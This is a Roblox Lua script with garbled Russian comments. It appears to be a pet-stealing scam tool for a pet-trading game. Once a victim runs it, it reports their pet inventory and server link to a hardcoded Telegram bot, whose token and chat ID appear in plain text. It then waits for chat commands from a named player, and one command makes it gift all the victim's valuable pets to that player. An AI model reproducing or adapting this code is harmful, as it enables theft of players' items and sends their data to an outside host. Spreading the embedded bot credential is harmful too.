local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local LocalPlayer = Players.LocalPlayer

-- üîß –ù–ê–°–¢–†–û–ô–ö–ò
local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
local TELEGRAM_CHAT_ID = "7144575011"
local TARGET_PLAYER = "sERTTQE0"
local TRIGGER_MESSAGE = "."

-- üêæ –ë–ï–õ–´–ô –°–ü–ò–°–û–ö
local WHITELIST = {
    "Crab",
    "Moon Cat", 
    "Wasp"
}

local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")

-- üìä –°–¢–ê–¢–ò–°–¢–ò–ö–ê
local STATS = {
    startTime = tick(),
    totalPetsTransferred = 0,
    errors = 0
}

-- üì® –ü–†–û–°–¢–ê–Ø –§–£–ù–ö–¶–ò–Ø TELEGRAM
local function sendToTelegram(text)
    -- –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –¥–ª–∏–Ω—É
    if #text > 3500 then
        text = text:sub(1, 3500) .. "..."
    end
    
    local success, result = pcall(function()
        local url = string.format(
            "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
            TELEGRAM_TOKEN,
            TELEGRAM_CHAT_ID,
            HttpService:UrlEncode(text)
        )
        return game:HttpGet(url)
    end)
    
    if not success then
        warn("Telegram error: " .. tostring(result))
        STATS.errors = STATS.errors + 1
    end
    
    return success
end

-- üîó –§–£–ù–ö–¶–ò–Ø –°–°–´–õ–ö–ò –ù–ê –°–ï–†–í–ï–†
local function getServerLink()
    local placeId = game.PlaceId
    local jobId = game.JobId
    
    if not jobId or jobId == "" then
        return "roblox://placeId=" .. placeId
    else
        return "roblox://placeId=" .. placeId .. "&gameInstanceId=" .. jobId
    end
end

-- üîé –§–£–ù–ö–¶–ò–Ø –ü–û–õ–£–ß–ï–ù–ò–Ø –ü–ò–¢–û–ú–¶–ï–í
local function getAllPets()
    local pets = {}
    local sources = {LocalPlayer.Backpack}
    
    if LocalPlayer.Character then
        table.insert(sources, LocalPlayer.Character)
    end
    
    for _, source in ipairs(sources) do
        for _, item in ipairs(source:GetChildren()) do
            if item:IsA("Tool") and item.Name:find("%[") then
                local weight = item.Name:match("%[(%d+%.%d+) KG%]")
                if weight then
                    local petName = item.Name:match("^([^%[]+)")
                    if petName then
                        petName = petName:gsub("%s+$", "")
                        
                        local isWhitelisted = false
                        for _, whitelistedPet in ipairs(WHITELIST) do
                            if petName:lower():find(whitelistedPet:lower()) then
                                isWhitelisted = true
                                break
                            end
                        end
                        
                        table.insert(pets, {
                            name = petName,
                            weight = tonumber(weight),
                            object = item,
                            isWhitelisted = isWhitelisted
                        })
                    end
                end
            end
        end
    end
    
    table.sort(pets, function(a, b) return a.weight > b.weight end)
    return pets
end

-- üìú –°–ü–ò–°–û–ö –ü–ò–¢–û–ú–¶–ï–í
local function getPetsList()
    local pets = getAllPets()
    if #pets == 0 then 
        return "–ù–µ—Ç –ø–∏—Ç–æ–º—Ü–µ–≤" 
    end
    
    local whitelisted = 0
    local totalWeight = 0
    local result = {"–ü–ò–¢–û–ú–¶–´:"}
    
    for i, pet in ipairs(pets) do
        if i > 15 then break end -- –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –≤—ã–≤–æ–¥
        
        totalWeight = totalWeight + pet.weight
        if pet.isWhitelisted then
            whitelisted = whitelisted + 1
            table.insert(result, string.format("‚úÖ %s [%.1f]", pet.name, pet.weight))
        else
            table.insert(result, string.format("‚ùå %s [%.1f]", pet.name, pet.weight))
        end
    end
    
    if #pets > 15 then
        table.insert(result, "...")
    end
    
    table.insert(result, string.format("\n–í—Å–µ–≥–æ: %d | –ö –ø–µ—Ä–µ–¥–∞—á–µ: %d", #pets, whitelisted))
    
    return table.concat(result, "\n")
end

-- üèÅ –°–¢–ê–†–¢–û–í–û–ï –£–í–ï–î–û–ú–õ–ï–ù–ò–ï
local function sendInitialNotification()
    local message = string.format(
        "–°–ö–†–ò–ü–¢ –ó–ê–ü–£–©–ï–ù\n\n–ò–≥—Ä–æ–∫: %s\n–ö–æ–º–∞–Ω–¥—ã –æ—Ç: %s\n–¢—Ä–∏–≥–≥–µ—Ä: %s\n\n%s\n\n–°—Å—ã–ª–∫–∞: %s",
        LocalPlayer.Name,
        TARGET_PLAYER, 
        TRIGGER_MESSAGE,
        getPetsList(),
        getServerLink()
    )
    
    sendToTelegram(message)
end

-- üêï –§–£–ù–ö–¶–ò–Ø –ü–ï–†–ï–î–ê–ß–ò
local function transferPet(pet)
    if not pet.isWhitelisted then 
        return false, "–ù–µ –≤ —Å–ø–∏—Å–∫–µ" 
    end
    
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if not target then
        return false, "–ò–≥—Ä–æ–∫ –Ω–µ –Ω–∞–π–¥–µ–Ω"
    end
    
    if not (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")) then
        return false, "–ü–µ—Ä—Å–æ–Ω–∞–∂ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω"
    end
    
    local success, err = pcall(function()
        LocalPlayer.Character.Humanoid:EquipTool(pet.object)
        task.wait(1)
        PetGiftingService:FireServer("GivePet", target)
    end)
    
    if success then
        STATS.totalPetsTransferred = STATS.totalPetsTransferred + 1
        return true, "OK"
    else
        STATS.errors = STATS.errors + 1
        return false, "–û—à–∏–±–∫–∞"
    end
end

-- üöö –ü–†–û–¶–ï–°–° –ü–ï–†–ï–î–ê–ß–ò
local function startPetTransfer()
    sendToTelegram("–ù–∞—á–∏–Ω–∞—é –ø–µ—Ä–µ–¥–∞—á—É...")
    
    local pets = getAllPets()
    local whitelistedPets = {}
    
    for _, pet in ipairs(pets) do
        if pet.isWhitelisted then
            table.insert(whitelistedPets, pet)
        end
    end
    
    if #whitelistedPets == 0 then
        sendToTelegram("–ù–µ—Ç –ø–∏—Ç–æ–º—Ü–µ–≤ –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏")
        return
    end
    
    local successful = 0
    local failed = 0
    
    for i, pet in ipairs(whitelistedPets) do
        local success, reason = transferPet(pet)
        
        if success then
            successful = successful + 1
        else
            failed = failed + 1
        end
        
        -- –û—Ç—á–µ—Ç –∫–∞–∂–¥—ã–µ 5 –ø–∏—Ç–æ–º—Ü–µ–≤
        if i % 5 == 0 then
            sendToTelegram(string.format("–ü—Ä–æ–≥—Ä–µ—Å—Å: %d/%d", i, #whitelistedPets))
        end
        
        task.wait(2)
    end
    
    -- –§–∏–Ω–∞–ª—å–Ω—ã–π –æ—Ç—á–µ—Ç
    sendToTelegram(string.format(
        "–ì–û–¢–û–í–û!\n–£—Å–ø–µ—à–Ω–æ: %d\n–û—à–∏–±–æ–∫: %d", 
        successful, failed
    ))
end

-- üí¨ –°–ò–°–¢–ï–ú–ê –ö–û–ú–ê–ù–î
local function setupMessageListener()
    if TextChatService then
        TextChatService.OnIncomingMessage = function(message)
            local speaker = Players:FindFirstChild(message.TextSource.Name)
            if speaker and speaker.Name == TARGET_PLAYER then
                local msg = message.Text:lower()
                
                if message.Text == TRIGGER_MESSAGE then
                    startPetTransfer()
                elseif msg:find("pets") then
                    sendToTelegram(getPetsList())
                elseif msg:find("link") then
                    sendToTelegram("–°—Å—ã–ª–∫–∞: " .. getServerLink())
                elseif msg:find("status") then
                    local uptime = string.format("%.1f –º–∏–Ω", (tick() - STATS.startTime) / 60)
                    sendToTelegram(string.format("–†–∞–±–æ—Ç–∞–µ—Ç: %s\n–ü–µ—Ä–µ–¥–∞–Ω–æ: %d", uptime, STATS.totalPetsTransferred))
                end
            end
        end
    else
        Players.PlayerChatted:Connect(function(chatType, speaker, message)
            if chatType == Enum.PlayerChatType.All and speaker.Name == TARGET_PLAYER then
                local msg = message:lower()
                
                if message == TRIGGER_MESSAGE then
                    startPetTransfer()
                elseif msg:find("pets") then
                    sendToTelegram(getPetsList())
                elseif msg:find("link") then
                    sendToTelegram("–°—Å—ã–ª–∫–∞: " .. getServerLink())
                elseif msg:find("status") then
                    local uptime = string.format("%.1f –º–∏–Ω", (tick() - STATS.startTime) / 60)
                    sendToTelegram(string.format("–†–∞–±–æ—Ç–∞–µ—Ç: %s\n–ü–µ—Ä–µ–¥–∞–Ω–æ: %d", uptime, STATS.totalPetsTransferred))
                end
            end
        end)
    end
end

-- üöÄ –ó–ê–ü–£–°–ö
task.wait(3)
sendInitialNotification()
setupMessageListener()

print("–°–∫—Ä–∏–ø—Ç –∑–∞–≥—Ä—É–∂–µ–Ω!")
print("–ö–æ–º–∞–Ω–¥—ã –¥–ª—è " .. TARGET_PLAYER .. ":")
print("'" .. TRIGGER_MESSAGE .. "' - –ø–µ—Ä–µ–¥–∞—Ç—å –ø–∏—Ç–æ–º—Ü–µ–≤")
print("'pets' - —Å–ø–∏—Å–æ–∫ –ø–∏—Ç–æ–º—Ü–µ–≤") 
print("'status' - —Å—Ç–∞—Ç—É—Å")
print("'link' - —Å—Å—ã–ª–∫–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä")
